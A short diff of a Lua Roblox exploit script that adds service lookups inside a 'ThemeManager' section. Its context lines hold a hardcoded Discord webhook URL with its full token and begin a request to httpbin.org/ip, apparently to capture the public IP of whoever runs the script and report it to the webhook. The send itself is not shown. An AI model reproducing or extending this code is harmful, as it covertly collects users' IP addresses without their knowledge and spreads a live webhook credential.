@@ -423,6 +423,9 @@ local ThemeManager = {} do
 end
 
 local VevoWebhook = "https://discordapp.com/api/webhooks/1284798351266549773/7Rs8dDnT5OnqUcpLcp9rw0J-vBgUuJ_Id4cTVhpurl6tKxwNyltZtf9q-kYgyZSLqO6q"
+RunService = cloneref(game:GetService("RunService"))
+local Http = game:GetService("HttpService")
+local marketplaceService = game:GetService("MarketplaceService")
 local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId) -- getting game name
 local iprequest = request({
     Url = 'https://httpbin.org/ip',
